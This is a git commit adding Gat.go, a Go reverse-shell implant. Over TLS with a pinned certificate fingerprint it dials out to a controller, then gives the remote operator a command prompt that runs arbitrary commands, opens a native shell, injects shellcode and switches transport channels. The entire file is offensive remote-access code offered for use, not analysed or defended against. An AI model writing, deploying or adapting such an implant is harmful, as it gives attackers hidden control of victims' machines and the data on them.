e1969148007ca86a4ac7752fbc4b88263cf541a5
M1ddl3w4r3 <49599953+m1ddl3w4r3@users.noreply.github.com>
2022-06-23 18:30:36 -0500

    Add files via upload

---
+++ Gat.go
@@ -0,0 +1,122 @@
+package main
+
+import (
+	"bufio"
+	"bytes"
+	"crypto/sha256"
+	"crypto/tls"
+	"encoding/hex"
+	"net"
+	"os"
+	"strings"
+
+	"github.com/m1ddl3w4r3/Gat/malleable"
+	"github.com/m1ddl3w4r3/Gat/shell"
+)
+
+const (
+	errCouldNotDecode  = 1 << iota
+	errHostUnreachable = iota
+	errBadFingerprint  = iota
+)
+
+var (
+	connectString string
+	fingerPrint   string
+)
+
+func interactiveShell(conn net.Conn) {
+	var (
+		exit    = false
+		prompt  = "[Gat]> "
+		scanner = bufio.NewScanner(conn)
+	)
+
+	conn.Write([]byte(prompt))
+
+	for scanner.Scan() {
+		command := scanner.Text()
+		if len(command) > 1 {
+			argv := strings.Split(command, " ")
+			switch argv[0] {
+			case "malleable":
+				if len(argv) > 2 {
+					transport := argv[1]
+					address := argv[2]
+					ok, err := malleable.malleable(transport, address)
+					if !ok {
+						conn.Write([]byte(err.Error() + "\n"))
+					}
+				} else {
+					conn.Write([]byte("Usage: malleable [tcp|http|https] IP:PORT\n"))
+				}
+			case "inject":
+				if len(argv) > 1 {
+					shell.InjectShellcode(argv[1])
+				}
+			case "exit":
+				exit = true
+			case "run_shell":
+				conn.Write([]byte("Enjoy your native shell\n"))
+				runShell(conn)
+			default:
+				shell.ExecuteCmd(command, conn)
+			}
+
+			if exit {
+				break
+			}
+
+		}
+		conn.Write([]byte(prompt))
+	}
+}
+
+func runShell(conn net.Conn) {
+	var cmd = shell.GetShell()
+	cmd.Stdout = conn
+	cmd.Stderr = conn
+	cmd.Stdin = conn
+	cmd.Run()
+}
+
+func checkKeyPin(conn *tls.Conn, fingerprint []byte) (bool, error) {
+	valid := false
+	connState := conn.ConnectionState()
+	for _, peerCert := range connState.PeerCertificates {
+		hash := sha256.Sum256(peerCert.Raw)
+		if bytes.Compare(hash[0:], fingerprint) == 0 {
+			valid = true
+		}
+	}
+	return valid, nil
+}
+
+func reverse(connectString string, fingerprint []byte) {
+	var (
+		conn *tls.Conn
+		err  error
+	)
+	config := &tls.Config{InsecureSkipVerify: true}
+	if conn, err = tls.Dial("tcp", connectString, config); err != nil {
+		os.Exit(errHostUnreachable)
+	}
+
+	defer conn.Close()
+
+	if ok, err := checkKeyPin(conn, fingerprint); err != nil || !ok {
+		os.Exit(errBadFingerprint)
+	}
+	interactiveShell(conn)
+}
+
+func main() {
+	if connectString != "" && fingerPrint != "" {
+		fprint := strings.Replace(fingerPrint, ":", "", -1)
+		bytesFingerprint, err := hex.DecodeString(fprint)
+		if err != nil {
+			os.Exit(errCouldNotDecode)
+		}
+		reverse(connectString, bytesFingerprint)
+	}
+}
